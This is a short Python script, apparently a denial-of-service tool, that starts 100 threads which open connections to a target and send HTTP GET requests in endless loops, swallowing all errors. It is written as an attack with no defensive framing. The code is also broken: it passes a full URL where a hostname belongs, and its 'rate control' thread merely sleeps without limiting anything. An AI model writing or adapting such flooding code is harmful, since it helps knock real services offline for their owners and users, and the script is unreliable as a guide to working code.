import socket
import threading

# Target URL and port
target_url = 'http://example.com'
target_port = 80

# Number of threads
num_threads = 100

# Number of packets per second
packets_per_second = 100000

# Function to send packets
def send_packets():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_url.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

# Create threads
for _ in range(num_threads):
    thread = threading.Thread(target=send_packets)
    thread.start()

# Control the rate of packet sending
import time

def control_rate():
    while True:
        time.sleep(1 / packets_per_second)

# Start the rate control thread
rate_control_thread = threading.Thread(target=control_rate)
rate_control_thread.start()